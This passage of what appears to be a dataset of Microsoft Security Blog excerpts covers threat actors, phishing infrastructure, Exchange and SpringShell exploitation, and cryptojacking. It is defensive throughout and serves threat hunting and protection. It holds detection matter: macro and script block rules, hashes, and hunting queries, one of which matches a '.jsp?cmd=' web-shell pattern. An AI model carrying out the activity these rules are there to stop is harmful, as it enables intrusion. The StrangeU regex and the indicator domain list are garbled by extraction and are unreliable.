subgroup that specializes in hacking into and stealing sensitive information from high-value targets. This Mint Sandstorm subgroup is technically and operationally mature, capable of developing bespoke tooling and quickly weaponizing N-day vulnerabilities, and has demonstrated agility in its operational focus, which appears to align with Iran's  national priorities. \nMicrosoft Threat Intelligence consistently tracks threat actor activity, including Mint Sandstorm and its subgroups, and works across Microsoft Security products and services to build detections into our products that improve protection for customers. As with any observed nation state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts. Microsoft is sharing details on these operations to raise awareness on the risks associated with their activity and to empower organizations to harden their attack surfaces against tradecraft commonly used by this Mint Sandstorm subgroup. ", "source": "microsoft"}, {"title": "Introduction", "content": "For security researchers, there's a distinction between hunting and detection. For novel threats, researchers try to strike a balance between high-fidelity detection rules identifying a specific, known malware family, threat actor, or class of behavior and low-fidelity hunting rules, which generate more false positives but also more generically capture a technique and its derivatives. \nThe following sections illustrate the art and science of how these lower-fidelity rules help threat hunters measure and contextualize suspicious observations to find novel or stealthy threats. ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft Defender Antivirus \nMicrosoft Defender Antivirus detects Sliver threat components as the following malware: \nTrojan:Linux/Sliver.A   \nTrojan:Win64/Sliver.D   \nTrojanDownloader:PowerShell/Splinter.A   \nBehavior:Win32/Splinter.A   \nVirTool:Win32/SPLINTER.A   \nVirTool:Win64/Splinter.A \nMicrosoft Defender Antivirus also detects Bumblebee loader as the following malware: \nTrojan:Win64/Bumblebee Trojan:Win64/BumbleBeeLoader Trojan:PowerShell/Bumblebee ", "source": "microsoft"}, {"title": "Introduction", "content": "By Ryan Kivett, Partner Director, Defender Experts \nLive dashboards and reports: Get a transparent view of our operations conducted on your behalf, along with a noise-free, actionable view of prioritized incidents and detailed analytics.   \nProactive check-ins: Benefit from remote, periodic check-ins with your named service delivery manager (SDM) team to guide your MXDR experience and improve your security posture.   \nFast and seamless onboarding: Get a guided baselining experience to ensure your Microsoft security products are correctly configured. ", "source": "microsoft"}, {"title": "defend", "content": "In the first cyberattack, Defender Experts for XDR provided detection, visibility, and coverage under what Microsoft Threat Intelligence tracks as the threat actor Purple Typhoon. From the early steps in the intrusion, our team alerted the customer that 11 systems and 13 accounts were compromised via a malicious Remote Desktop Protocol (RDP) session, leveraging a Dynamic Link Library (DLL) Search Order Hijacking on a legitimate Notepad $^{++}$ executable. As is common with this threat actor, the next cyberattack, established a Quasar RAT backdoor triggering keylogging, capturing credentials for the domain admin. After the loaders were executed, scheduled tasks were used to move laterally, execute discovery commands on internal network areas, and complete credential theft dumping. \nFor the second cyberattack, which used BlackCat ransomware, Defender Experts for XDR detected and provided extensive guidance on investigation and remediation actions. The BlackCat ransomware, also known as\u202fALPHV, is a prevalent cyberthreat and a prime example of the growing\u202fransomware-as-a-service (RaaS) gig economy. It's noteworthy due to its unconventional programming language (Rust), multiple target devices and possible entry points, and affiliation with prolific threat activity groups. While BlackCat's arrival and execution vary based on the actors deploying it, the outcome is the same-target data is encrypted, exfiltrated, and used for \"double extortion,\" where attackers threaten to release the stolen data to the public if the ransom isn't paid. This attack used access broker credentials to perform lateral movement, exfiltrate sensitive data via privileged execution, and execute ransomware encryption malware. \nIn both cyberattacks, our team focused on providing focused email, in-product focus to guide the customer, and in a real world cyberattack, our service and product would take disruption actions to stop the cyberattack. ", "source": "microsoft"}, {"title": "defend", "content": "As the second cyberattack leveraged BlackCat ransomware, Microsoft Defender XDR's attack disruption capability automatically contained the threat and then followed up with hunter guidance on additional containment. This capability combines our industry-leading detection with AI-powered enforcement mechanisms to help mitigate cyberthreats early on in the cyberattack chain and contain their advancement. Analysts have a powerful tool against human-operated cyberattacks while leaving them in complete control of investigating, remediating, and bringing assets back online. ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft Incident Response (previously known as Microsoft Detection and Response Team \u2013 DART), through forensic analysis of devices infected with BlackLotus, has identified multiple opportunities for detection along several steps in its installation and execution processes. The artifacts analyzed include: \nRecently written bootloader files   \nStaging directory artifacts created   \nRegistry key modified   \nWindows Event logs entries generated   \nNetwork behavior   \nBoot Configuration log entries generated \nAs threat hunters begin examining environments, it is crucial to adopt a comprehensive hunting strategy across these artifacts to down-filter false positives and surface true positives. Many of these artifacts, when observed in isolation, are low fidelity. Observing them in tandem with others, however, increases their significance in determining if a device has been infected. ", "source": "microsoft"}, {"title": "Introduction", "content": "We spotted the first segment of the infrastructure in March, when multiple domains were registered using distinct naming patterns, including the heavy use of the word \"strange\", inspiring the name StrangeU. In April, a second segment of the infrastructure, one that used domain generation algorithm (DGA), began registration as well. We call this segment RandomU. \nThe emergence of this infrastructure in March dovetailed with the disruption of the Necurs botnet that resulted in the reduction of service. Before being disrupted, Necurs was one of the world's largest botnets and was used by prolific malware campaign operators such as those behind Dridex. For-sale services like Necurs enable attackers to invest in malware production while leasing the delivery components of their activities to further obfuscate their behavior. The StrangeU and RandomU infrastructure appear to fill in the service gap that the Necurs disruption created, proving that attackers are highly motivated to quickly adapt to temporary interruptions to their operations. \nFigure 1. Timeline of staging and utilization of the email infrastructure \nAt first, the new email infrastructure was used infrequently in campaigns that distributed highly commodity malware like Mondfoxia and Makop. Soon, however, it attracted the attention of Dridex and Trickbot operators, who began using the infrastructure for portions of their campaigns, sometimes entirely and sometimes mixed with other compromised infrastructure or email providers. \nAnalyzing these mail clusters provides insight into how human the tangled web of modular attacker infrastructure remains. From unifying key traits in registration and behavior to the simple and effective techniques that the wide variety of malware uses, attackers' goals in this diversification point toward combatting automated analysis. However, these same shared characteristics and methods translate to insights that inform resilient protections that defend customers against these attacks. ", "source": "microsoft"}, {"title": "defend", "content": "As attacks continue to grow in modularity, the tactics that attackers use to deliver phishing email, gain initial access on systems, and move laterally will continuously become more varied. This research shows that despite these disparities and the increased resiliency attackers have built, the core tactics and tools that they use are still limited in scope, relying repeatedly on familiar malicious macros, lures, and sending tactics. \nSweeping research into massive attacker infrastructures, as well as our real-time monitoring of malware campaigns and attacker activity, directly inform Microsoft security solutions, allowing us to build or improve protections that block malware campaigns and other email threats, both current and future, as well as provide enterprises with the tools for investigating and responding to email campaigns in real-time. \nMicrosoft delivers these capabilities through Microsoft Defender for Office 365. Features likes Safe attachments and Safe links ensure real-time, dynamic protection against email campaigns no matter the lure or evasion tactic. These features use a combination of detonation, automated analysis, and machine learning to detect new and unknown threats. Meanwhile, the Campaign view shows the complete picture of email campaigns as they happen, including timelines, sending patterns, impact to the organization, and details like IP addresses, senders, and URLs. These insights into email threats empower security operations teams to respond to attacks, perform additional hunting, and fix configuration issues. \nArmed with an advanced solution like Microsoft Defender for Office 365 and the rest of technologies in the broader Microsoft 365 Defender solution, enterprises can further increase resilience against threats by following these recommendations: \nEducate end users about protecting personal and business information in social media, filtering unsolicited communication, identifying lures in spearphishing email, and reporting of reconnaissance attempts and other suspicious activity. Configure Office 365 email filtering settings to ensure blocking of phishing & spoofed emails, spam, and emails with malware. Set Office 365 to recheck links on click and delete sent mail to benefit from newly acquired threat intelligence. Disallow macros or allow only macros from trusted locations. See the latest\u202fsecurity baselines for Office and Office 365.   \nTurn on AMSI for Office VBA.   \nCheck perimeter firewall and proxy to restrict servers from making arbitrary connections to the internet to browse or download files. Turn on network protection to block connections to malicious domains and IP addresses. Such restrictions help inhibit malware downloads and command-and-control activity. \nTurning on\u202fattack surface reduction rules, including rules that can block advanced macro activity, executable content, process creation, and process injection initiated by Office applications, also significantly improves defenses. The following rules are especially useful in blocking the techniques observed in campaigns using the StrangeU and RandomU infrastructure: \nBlock executable content from email client and webmail   \nBlock all Office applications from creating child processes   \nBlock Office applications from creating executable content   \nBlock Office applications from injecting code into other processes   \nBlock Win32 API calls from Office macros   \nBlock executable files from running unless they meet a prevalence, age, or   \ntrusted list criterion   \nBlock Javascript or VBScript from launching downloaded executable content   \nBlock execution of potentially obfuscated scripts \nMicrosoft 365 customers can also use the advanced hunting capabilities in Microsoft 365 Defender, which integrates signals from Microsoft Defender for Office 365 and other solutions, to locate activities and artifacts related to the \nWhat tracking an attacker email infrastructure tells us about persistent cybercriminal operations | Microsoft Security Blog infrastructure and campaigns discussed in this blog. These queries can be used with advanced hunting in Microsoft 365 security center, but the same regex pattern can be used on other security tools to identify or block emails. \nThis query searches for emails sent from StrangeU\u202femail addresses. Run query \nEmailEvents   \n|\u202fwhere\u202fSenderMailFromDomain\u202fmatches   \nregex\u202f@\"^(?:eraust|ereply|reply|ereceived|received|reaust|esend|inv|send|ema   \nilboost|eontaysstrange|eprop|frost|eont|servicply).\\*   \n(strange|stange|emailboost). $\\ast\\setminus.\\cup\\sf S\\$1$ \"   \nor\u202fSenderFromDomain\u202fmatches   \nregex\u202f@\"^(?:eraust|ereply|reply|ereceived|received|reaust|esend|inv|send|ema   \nilboost|eontaysstrange|eprop|frost|eont|servicply).\\*   \n(strange|stange|emailboost).\\*\\.us\\$\" \nLearn how you can stop attacks through automated, cross-domain security and built-in AI with Microsoft Defender 365. ", "source": "microsoft"}, {"title": "Indicators of compromise", "content": "esendsstrangeasia[.]us sendsstrangesecuretoday[.] emailboostgedigital[.]us us   \nemailboostgelife[.]us emailboostgelifes[.]us emailboostgesecureasia[.]u s   \neontaysstrangeasia[.]us eontaysstrangenetwork[.]us eontaysstrangerocks[.]us   \neontaysstrangesecureasia[.] epropivedsstrangevip[.]us ereplyggstangeasia[.]us   \nus   \nereplyggstangedigital[.]us ereplyggstangeereplys[.]us ereplyggstangelifes[.]us   \nereplyggstangenetwork[.]u ereplyggstangesecureasia[. frostsstrangeworld[.]us   \ns ]us   \nservicceivedsstrangevip[.]us servicplysstrangeasia[.]us servicplysstrangedigital[.]us servicplysstrangenetwork[.]   \nservicplysstrangelife[.]us servicplysstrangelifes[.]us us   \nereceivedsstrangesecurewo ereceivedsstrangetoday[.]u ereceivedsstrangeus[.]us   \nrld[.]us s   \nesendsstrangesecurelife[.]u sendsstrangesecureesendss ereplysstrangesecureasia[.]   \ns [.]us us   \nereplysstrangesecurenetwo receivedsstrangesecurelife[. ereplysstrangeworld[.]us   \nrk[.]us ]us   \nreauestysstrangesecurelive[ ereceivedsstrangeworld[.]u esendsstrangesecurerocks[.   \n.]us s ]us   \nreauestysstrangesecuredigi reauestysstrangesecurenet reauestysstrangesecurevip[.   \ntal[.]us work[.]us ]us s[.]us   \nereceivedsstrangelifes[.]us ereceivedsstrangenetwork[. ereceivedsstrangerocks[.]us ]us ereceivedsstrangesecureasi receivedsstrangeworld[.]us replysstrangedigital[.]us a[.]us   \ninvdeliverynows[.]us [e.]suesndsstrangesecuredigital .e]suesndsstrangesecureworld[ sendsstrangesecurenetwor ereceivedsstrangevip[.]us replysstrangerocs[.]us k[.]us   \nreplysstrangesecurelive[.]us invpaymentnoweros[.]us invpaymentnowes[.]us reauestysstrangesecurebest receivedsstrangesecurebest replysstrangeracs[.]us [.]us [.]us   \n]ruesauestysstrangesecurelife[. ereplysstrangevip[.]us raeya[.]uuesstysstrangesecuretod ereplysstrangesecureus[.]us ereplysstrangetoday[.]us ereceivedsstrangesecuredi gital[.]us   \nereceivedsstrangesecureer ereceivedsstrangesecurelife ereceivedsstrangesecurene eceiveds[.]us [.]us twork[.]us   \nereceivedsstrangesecurero ereceivedsstrangesecureus[ ereceivedsstrangesecurevip cks[.]us .]us [.]us   \nssendsstrangesecurebest[.]u ]suesndsstrangesecuredigital[. sendsstrangesecurelive[.]us sendsstrangesecureworld[.] esendsstrangedigital[.]us esendsstrangeesends[.]us us   \nesendsstrangelifes[.]us esendsstrangerocks[.]us eussendsstrangesecureasia[.] se[s.]eunsdsstrangesecureesend reks[e.]nudssstrangesecurenetwo esendsstrangesecureus[.]us sesendsstrangesecurevip[.]u esendsstrangevip[.]us ae[r.e]uasuestysstrangesecureasi ereplysstrangeasia[.]us ereplysstrangedigital[.]us ereplysstrangeereplys[.]us ereplysstrangelife[.]us ereplysstrangelifes[.]us ereplysstrangenetwork[.]us ereplysstrangerocks[.]us [e.]ruesplysstrangesecuredigital se[r.]eupslysstrangesecureereply ereplysstrangesecurelife[.]u ereplysstrangesecurerocks[. ereplysstrangesecurevip[.]u s ]us s   \n.]us ereplysstrangeus[.]us [r.e]uasuestysstrangesecureclub reauestysstrangesecureere reauestysstrangesecurewor receivedsstrangesecureclub auestyss[.]us ld[.]us [.]us   \nreceivedsstrangesecuredigi receivedsstrangesecureerec receivedsstrangesecurelive[ tal[.]us eivedss[.]us .]us   \nreceivedsstrangesecurenet receivedsstrangesecuretod receivedsstrangesecurevip[. work[.]us ay[.]us ]us   \nreceivedsstrangesecureworl replysstrangesecurebest[.]u replysstrangesecureclub[.]u d[.]us s s   \nreplysstrangesecuredigital[. replysstrangesecureereplys replysstrangesecurenetwor ]us s[.]us k[.]us   \nruesplysstrangesecuretoday[.] replysstrangesecurevip[.]us ruesplysstrangesecureworld[.] sendsstrangesecurevip[.]us esendsstrangelife[.]us esendsstrangenetwork[.]us esendsstrangetoday[.]us esendsstrangeus[.]us esendsstrangeworld[.]us ssendsstrangesecureclub[.]u sendsstrangesecurelife[.]us plysstrangelifes[.]us intulifeinoi[.]us replysstrangerocks[.]us invpaymentnowe[.]us replysstrangelifes[.]us replysstrangenetwork[.]us invdeliverynowr[.]us servicceivedsstrangeworld[. ereceivedggstangevip[.]us ereplyggstangerocks[.]us   \n]us \nWhat tracking an attacker email infrastructure tells us about persistent cybercriminal operations | Microsoft Security Blog servicplysstrangesecureasia servicplysstrangeservicplys[ emailboostgeasia[.]us [.]us .]us emailboostgeereplys[.]us emailboostgenetwork[.]us emailboostgerocks[.]us eontaysstrangedigital[.]us eontaysstrangeeontays[.]us eontaysstrangelife[.]us epropivedsstrangeworld[.]u ereceivedggstangeworld[.] eontaysstrangelifes[.]us s us ereplyggstangelife[.]us frostsstrangevip[.]us servicplysstrangerocks[.]us invdeliverynow[.]us invpaymentnowlife[.]us invdeliverynowes[.]us invpaymentnowwork[.]us replysstrangedigitals[.]us replysstrangelife[.]us replysstrangelifee[.]us replystrangeracs[.]us ", "source": "microsoft"}, {"title": "Introduction", "content": "The first known attacks leveraging the Exchange Server vulnerabilities were by the nation-state actor HAFNIUM, which we detailed in this blog. In the three weeks after the Exchange server vulnerabilities were disclosed and the security updates were released, Microsoft saw numerous other attackers adopting the exploit into their toolkits. Attackers are known to rapidly work to reverse engineer patches and develop exploits. In the case of a remote code execution (RCE) vulnerability, the rewards are high for attackers who can gain access before an organization patches, as patching a system does not necessarily remove the access of the attacker. \nIn our investigation of the on-premises Exchange Server attacks , we saw systems being affected by multiple threats. Many of the compromised systems have not yet received a secondary action, such as human-operated ransomware attacks or data exfiltration, indicating attackers could be establishing and keeping their access for potential later actions. These actions might involve performing follow-on attacks via persistence on Exchange servers they have already compromised, or using credentials and data stolen during these attacks to compromise networks through other entry vectors. \nAttackers who included the exploit in their toolkits, whether through modifying public proof of concept exploits or their own research, capitalized on their window of opportunity to gain access to as many systems as they could. Some attackers were advanced enough to remove other attackers from the systems and use multiple persistence points to maintain access to a network. \nWe have built protections against these threats into Microsoft security solutions. Refer to the Appendix for a list of indicators of compromise, detection details, and advanced hunting queries. We have also provided additional tools and \nAnalyzing attacks taking advantage of the Exchange Server vulnerabilities | Microsoft Security Blog investigation and remediation guidance here: https://aka.ms/exchange-customerguidance. \nWhile performing a full investigation on systems is recommended, the following themes are common in many of the attacks. These are prevailing threat trends that Microsoft has been monitoring, and existing solutions and recommendations for prevention and mitigation apply: \nWeb shells \u2013 As of this writing, many of the unpatched systems we observed had multiple web shells on them. Microsoft has been tracking the rise of web shell attacks for the past few years, ensuring our products detect these threats and providing remediation guidance for customers. For more info on web shells, read Web shell attacks continue to rise. We have also published guidance on web shell threat hunting with Azure Sentinel. Human-operated ransomware \u2013 Ransomware attacks pose some of the biggest security risks for organizations today, and attackers behind these attacks were quick to take advantage of the on-premises Exchange Server vulnerabilities. Successfully exploiting the vulnerabilities gives attackers the ability to launch human-operated ransomware campaigns, a trend that Microsoft has been closely monitoring. For more information about humanoperated ransomware attacks, including Microsoft solutions and guidance for improving defenses, read: Human-operated ransomware attacks. Credential theft \u2013 While credential theft is not the immediate goal of some of these attacks, access to Exchange servers allowed attackers to access and potentially steal credentials present on the system. Attackers can use these stolen credentials for follow-on attacks later, so organizations need to prioritize identifying and remediating impacted identities. For more information, read best practices for building credential hygiene. \nIn the following sections, we share our analysis of known post-compromise activities associated with exploitation of the Exchange server vulnerabilities because it is helpful to understand these TTPs, in order to defend against other actors using similar tactics or tools. While levels of disruptive post-compromise activity like ransomware may be limited at the time of this writing, Microsoft will continue to track this space and share information with the community. It's important to note that with some post-compromise techniques, attackers may gain highly privileged persistent access, but many of the impactful subsequent attacker activities can be mitigated by practicing the principle of least privilege and mitigating lateral movement. ", "source": "microsoft"}, {"title": "defend", "content": "Attackers exploit the on-premises Exchange Server vulnerabilities in combination to bypass authentication and gain the ability to write files and run malicious code. The best and most complete remediation for these vulnerabilities is to update to a supported Cumulative Update and to install all security updates. Comprehensive mitigation guidance can be found here: https://aka.ms/ExchangeVulns. \nAs seen in the post-exploitation attacks discussed in this blog, the paths that attackers can take after successfully exploiting the vulnerabilities are varied and wide-ranging. If you have determined or have reason to suspect that these threats are present on your network, here are immediate steps you can take: \nInvestigate exposed Exchange servers for compromise, regardless of their current patch status.   \nLook for web shells via our guidance and run a full AV scan using the Exchange On-Premises Mitigation Tool.   \nInvestigate Local Users and Groups, even non-administrative users for changes, and ensure all users require a password for sign-in. New user account creations (represented by Event ID 4720) during the time the system was vulnerable might indicate a malicious user creation.   \nReset and randomize local administrator passwords with a tool like LAPS if you are not already doing so.   \nLook for changes to the RDP, firewall, WMI subscriptions, and Windows Remote Management (WinRM) configuration of the system that might have been configured by the attacker to allow persistence.   \nLook for Event ID 1102 to determine if attackers cleared event logs, an activity that attackers perform with exe in an attempt to hide their tracks.   \nLook for new persistence mechanisms such as unexpected services, scheduled tasks, and startup items.   \nLook for Shadow IT tools that attackers might have installed for persistence, such as non-Microsoft RDP and remote access clients.   \nCheck mailbox-level email forwarding settings (both ForwardingAddress and ForwardingSMTPAddress attributes), check mailbox inbox rules (which might be used to forward email externally), and check Exchange Transport rules that you might not recognize. \nWhile our response tools check for and remove known web shells and attack tools, performing a full investigation of these systems is recommended. For comprehensive investigation and mitigation guidance and tools, see https://aka.ms/exchange-customer-guidance. \nAnalyzing attacks taking advantage of the Exchange Server vulnerabilities | Microsoft Security Blog Additionally, here are best practices for building credential hygiene and practicing the principle of least privilege: \nFollow guidance to run Exchange in least-privilege configuration: https://adsecurity.org/?p=4119. Ensure service accounts and scheduled tasks run with the least privileges they need. Avoid widely privileged groups like domain admins and backup operators and prefer accounts with access to just the systems they need.   \nRandomize local administrator passwords to prevent lateral movement with tools like LAPS.   \nEnsure administrators practice good administration habits like Privileged Admin Workstations.   \nPrevent privileged accounts like domain admins from signing into member servers and workstations using Group Policy to limit credential exposure and lateral movement. ", "source": "microsoft"}, {"title": "Introduction", "content": "Adversary-in-the-middle (T1557, T1111) is a type of attack that aims to intercept authentication between users and a legitimate authentication service for the purpose of compromising identities or performing other actions. The attackers position themselves between a user and the service to steal credentials and intercept MFA in order to capture the session cookie. The attackers can then replay the session with the stolen session cookie before the token expiration time and impersonate the user without user intervention or MFA. With this session, the attackers could access the affected user's resources and applications and perform business email compromise attacks and other malicious activities. More details about AiTM campaigns can be found on the blog Attackers use AiTM phishing sites as entry point to further financial fraud. \nUnlike campaigns we have previously reported, this attack did not use the reverse proxy method that AiTM kits like EvilProxy and NakedPages use, in which the attacker's server proxies the request from the application's legitimate sign-in page. Instead, the attack used AiTM attack with indirect proxy method, in which the attacker presented targets with a website that mimicked the sign-in page of the targeted application, as in traditional phishing attacks, hosted on a cloud service. \nDetecting and mitigating a multi-stage AiTM phishing and BEC campaign | Microsoft Security Blog The said sign-in page contained resources loaded from an attacker-controlled server, which initiated an authentication session with the authentication provider of the target application using the victim's credentials. \nIn this AiTM attack with indirect proxy method, since the phishing website is set up by the attackers, they have more control to modify the displayed content according to the scenario. In addition, since the phishing infrastructure is controlled by the attackers, they have the flexibility to create multiple servers to evade detections. Unlike typical AiTM attacks, there are no HTTP packets proxied between the target and the actual website. \nWhen MFA is requested after successful password validation, the server displays a fake MFA page. Once the MFA is provided by the user, the attacker uses the same MFA token in the initiated session with the authentication provider. Following successful authentication, the session token is granted to the attacker, and victim is redirected to another page. The following diagram illustrates the AiTM attack observed in this scenario: ", "source": "microsoft"}, {"title": "Defense", "content": "This AiTM attack's use of indirect proxy is an example of the threat's increasingly complex and evolving TTPs to evade and even challenge conventional solutions and best practices. Proactively hunting for and quickly responding to threats thus becomes an even more important aspect in securing organization networks because it provides an added layer to other security remediations and can help address areas of defense evasion. \nMicrosoft Defender Experts is part of Microsoft's global network of more than 8,000 security analysts and researchers who, through our managed services like Microsoft Defender Experts for Hunting, help extend organizations' ability to defend their environment, manage security, and even augment SOC teams. Our experts also enrich our vast cross-domain signals and let us deliver coordinated threat defense in our security products and solutions. \nIn this incident, because our experts actively research for new AiTM and BEC techniques, they were able to create advanced hunting detections for the Defender Experts service. These detections, combined with our experts' own analyses of the anomalous emails and user behavior, enabled them to uncover the attack at its early stages, analyze the entire attack chain, and identify and promptly reach out to affected and targeted customers through Defender Experts Notifications. They then continuously monitored the attack for any additional compromised users or changes in the phishing patterns as it rapidly unfolded into a large-scale campaign. \nDefender Experts also initiated rapid response with Microsoft 365 Defender to contain the attack including: \nAutomatically disrupting the AiTM attack on behalf of the impacted users based on the signals observed in the campaign Initiating zero-hour auto purge (ZAP) in Microsoft Defender for Office 365 to find and take automated actions on the emails that are a part of the phishing campaign \nDefender Experts further worked with customers to remediate compromised identities through the following recommendations: \nRevoking session cookies in addition to resetting passwords Revoking the MFA setting changes made by the attacker on the compromised user's accounts Require re-challenging MFA for MFA updates as the default ", "source": "microsoft"}, {"title": "Introduction", "content": "IIS is a flexible, general purpose web server that has been a core part of the Windows platform for many years now. As an easy-to-manage, modular, and extensible platform for hosting websites, services, and applications, IIS serves critical business logic for numerous organizations. The modular architecture of IIS allows users to extend and customize web servers according to their needs. These extensions can be in the form of native $(\\mathsf{C}/\\mathsf{C}++)$ and managed (C#, VB.NET) code structures, with the latter being our focus on this blog post. The extensions can further be categorized as modules and handlers. \nThe IIS pipeline is a series of extensible objects that are initiated by the ASP.NET runtime to process a request. IIS modules and handlers are .NET components that serve as the main points of extensibility in the pipeline. Each request is processed by multiple IIS modules before being processed by a single IIS handler. Like a set of building blocks, modules and handlers are added to provide the desired functionality for the target application. In addition, handlers can be configured to respond to specific attributes in the request such a $\\mathsf{U R L},$ , file extension, and HTTP method. For example, Aspnet_isapi.dll is a pre-configured IIS handler for common .aspx extensions. ", "source": "microsoft"}, {"title": "Protection", "content": "It's critical to protect servers with Windows antivirus software and other security solutions like firewall protection and MFA. Turn on cloud-delivered protection and automatic sample submission in Microsoft Defender Antivirus to use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. Use attack surface reduction rules to automatically block behaviors like credential theft and suspicious use of PsExec and Windows Management Instrumentation (WMI). Turn on tamper protection features to prevent attackers from stopping security services. \nMalicious IIS extensions quietly open persistent backdoors into servers | Microsoft Security Blog If you are worried that these security controls will affect performance or disrupt operations, engage with IT professionals to help determine the true impact of these settings. Security teams and IT professionals should collaborate on applying mitigations and appropriate settings. ", "source": "microsoft"}, {"title": "Introduction", "content": "In incident response investigations and proactive research in the past year, we observed threat actors abusing administrative features to deploy and manage cryptocurrency mining resources in compromised tenants. Many of these attacks take advantage of automation, which increases the potential threat to cloud environments. \nCryptocurrency mining using central processing unit (CPU) or graphics processing unit (GPU) compute in cloud environments is not financially viable if one is paying for the compute used. In order to profit, threat actors use malicious methods to avoid paying for the resources, such as abusing free trials or compromising legitimate tenants to conduct cryptojacking attacks. \nUnlike free trial abuse, which the cloud provider may be able to detect, cryptojacking in compromised tenants is more challenging to identify since it involves the threat actor having access to a legitimate user account. This complex method impacts the user more directly, as it allows the threat actor to make more intrusive changes in the target environment: \nUtilize available compute quota from compromised tenants, and provision significantly more compute and other additional resources. Mask resource provisioning activity as legitimate when operating within a compromised tenant. Use access to the compromised tenant to do further lateral movement, achieve persistence, and conduct information theft. \nSuccessful cloud cryptojacking attacks could result in significant unexpected charges to the compromised tenant and depletion of resources that the tenant might need for business continuity, potentially resulting in service interruption, highlighting the need to prevent, detect and mitigate cloud cryptojacking attacks ", "source": "microsoft"}, {"title": "Defense", "content": "After gaining access to the tenant and performing reconnaissance to determine available permissions, the attacker may proceed to hijack the subscription. Subscription hijacking has been covered previously in the blog entry Hunt for compromised Azure subscriptions using Microsoft Defender for Cloud Apps. \nSubscription hijacking is an evasion technique that allows the threat actor to hide some of their activities from the tenant administrator and security teams. Migrating a subscription directory requires the threat actor to have sufficient privileges in the target subscription. In cases observed by Microsoft, the destination tenant may be attacker-controlled or another affected tenant that the threat actor has access to. \nAdditionally, subscription hijacking is disruptive forensically. Microsoft Incident Response has observed instances where a threat actor compromised accounts in customer environments that were over-privileged. Abusing over-privileged accounts allowed the threat actor to migrate the subscription to a separate tenant (often attacker-controlled) to spin up additional resources. While activity logs at the subscription level remain with the subscription, anything recorded at the tenant role-based access control (RBAC) level is recorded in the new tenant, making forensic analysis, understanding the full timeline, or incident response by or for the customer, more challenging. ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft 365 Defender is becoming Microsoft Defender XDR. Learn more. \nMicrosoft 365 Defender uses its cross-workloads detection capabilities to provide enhanced protection against cryptocurrency mining attacks. Microsoft 365 Defender customers who have enabled their Azure connector in Microsoft Defender for Cloud Applications can benefit from the following alerts: \nAccess elevation by risky user Suspicious Azure activities related to possible cryptocurrency mining \nMass provisioning of GPU virtual machines for possible cryptocurrency mining Suspicious creation of multiple Azure ML clusters and workspaces Suspicious role assignment in Azure subscription VM quota modified after risky user signed in ", "source": "microsoft"}, {"title": "Introduction", "content": "When Microsoft Defender ATP raises an alert on an observed suspicious behavior, information about the process, associated file, process tree, and various such signals that span across devices are sent to multiple classifiers. The rapid protection loop engine inspects and correlates the info with other signals to arrive at a decision whether to block a file. \nThis results in the rapid blocking of confirmed malware on a machine where EDR capabilities detected suspicious behaviors. This decision is then used to drive protection across the entire ecosystem through rapid blocking and containment. Such a detection could stop an attack on the machine, on other machines in the organization, and other organizations as an attack attempts to broaden its foothold. \nFor example, on January 10, 2020, Microsoft Defender ATP detected a privilege escalation activity on a machine in a certain organization and raised the alert \"Possible privilege escalation using NTLM relay\". ", "source": "microsoft"}, {"title": "Protection", "content": "A defense in depth strategy requires multiple layers of protection. Multiple security components inspect Microsoft Defender ATP alerts for various actions. Autoinvestigation and response capabilities kick in to automatically remediate threats. Cloud-based machine learning models in next-generation protection engines also run multiple classifiers to determine whether a file is confirmed malicious and should be blocked. The expanded behavioral blocking and containment adds another layer of protection that helps ensure there are multiple points at which an attack can be stopped. \nOn January 13, a file named DowloadX.exe (SHA-256:   \n971bc7eb2be734262a573ca7dc086c334f3a40ae874af90e7f380ec1a6221d7c) triggered the Microsoft Defender ATP alert \"A suspicious file was observed\" on a machine in one organization. The file was attempting to connect to certain domains to download files. ", "source": "microsoft"}, {"title": "Protection", "content": "Through Microsoft Threat Protection, behavioral blocking and containment and other solutions that are informed by Microsoft Defender ATP's EDR alerts also benefit from the signal-sharing across Microsoft security services. This broadens defense in depth even further, demonstrating how signals from multiple points in the attack chain allow Microsoft Threat Protection to deliver unparalleled comprehensive protection. \nFor example, on January 14, 2019, Microsoft Defender ATP's EDR raised an alert on a new malicious Java Archive (JAR) file (SHA-256:   \n0d646ac10665f629adde73f1e3bb1afcc69e12a6f286d516c579c6ce0b22e892) based on information from Office 365 ATP. The alert, \"A malicious file was detected based on indication provided by Office $365\"$ , means that the malware had previously been observed and blocked in an organization protected by Office 365 ATP. Using information from Office 365 ATP, Microsoft Defender ATP EDR instantly raised an alert when it encountered the file in other organizations, while cloud-based protections blocked the file in these organizations. ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft regularly monitors attacks against our cloud infrastructure and services to defend them better. Since the Spring Core vulnerability was announced, we have been tracking a low volume of exploit attempts across our cloud services for Spring Cloud and Spring Core vulnerabilities. For CVE-2022-22965, the attempts closely align with the basic web shell POC described in this post. \nMicrosoft's continued monitoring of the threat landscape has not indicated a significant increase in quantity of attacks or new campaigns at this time. ", "source": "microsoft"}, {"title": "Protection", "content": "Customers using Azure Firewall Premium have enhanced protection from the SpringShell CVE-2022-22965 vulnerability and exploits. Azure Firewall Premium Intrusion Detection and Prevention System (IDPS) provides IDPS inspection for all east-west traffic, outbound traffic to the internet, and inbound HTTP traffic from the internet. The vulnerability rulesets are continuously updated and include vulnerability protection for SpringShell since March 31, 2022. The screenshot below shows all the scenarios which are actively mitigated by Azure Firewall Premium. \nConfigure Azure Firewall Premium with both IDPS Alert & Deny mode and TLS inspection enabled for proactive protection against CVE-2022-22965 exploit. \nCustomers using Azure Firewall Standard can migrate to Premium by following these directions. Customers new to Azure Firewall Premium can learn more about Firewall Premium. ", "source": "microsoft"}, {"title": "defend", "content": "Endpoint detection and response (EDR) \nAlerts with the following title in the security center can indicate threat activity on your network: \nPossible SpringShell exploitation \nThe following alerts for an observed attack, but might not be unique to exploitation for this vulnerability: \nSuspicious process executed by a network service ", "source": "microsoft"}, {"title": "defend", "content": "Use the query below to surface exploitation of CVE-2022-22965 on both victim devices and devices performing the exploitation. Note that this query only covers HTTP use of the exploitation and not HTTPS. \nDeviceNetworkEvents   \n| where Timestamp $>$ ago(7d)   \n| where ActionType $=\\sim$ \"NetworkSignatureInspected\"   \n| where AdditionalFields contains \".jsp?cmd=\"   \n| summarize makeset(AdditionalFields, 5), min(Timestamp), max(Timestamp)   \nby DeviceId, DeviceName ", "source": "microsoft"}, {"title": 